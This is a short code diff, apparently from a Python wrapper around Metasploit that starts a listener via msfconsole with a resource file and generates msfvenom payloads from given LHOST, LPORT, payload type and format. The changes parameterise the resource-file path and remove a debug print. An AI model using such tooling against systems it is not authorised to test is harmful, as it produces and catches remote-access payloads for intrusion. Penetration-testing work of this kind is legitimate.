@@ -359,7 +359,7 @@ def payload_handler():
         print("Starting...")
         cmd='/etc/init.d/postgresql start'
         subprocess.check_output(cmd, shell=True)
-        handler_start = 'msfconsole -r handler.rc'
+        handler_start = 'msfconsole -r {}'.format(path)
         subprocess.call(handler_start, shell=True)
     else:
         print("\033[1;31mPayload not set for listening, use 'generate <id>' for payload setup")
@@ -367,7 +367,6 @@ def payload_handler():
 
 def payload_generator(ip, port, payload, filename, file_format):
     generate_cmd = 'msfvenom -p {} LHOST={} LPORT={} -f {} > {}'.format(payload, ip, port, file_format, filename)
-    print(generate_cmd)
     print("\033[1;32mGenerating Payload....")
     subprocess.call(generate_cmd, shell=True)
     pwd=subprocess.check_output('pwd', shell=True)
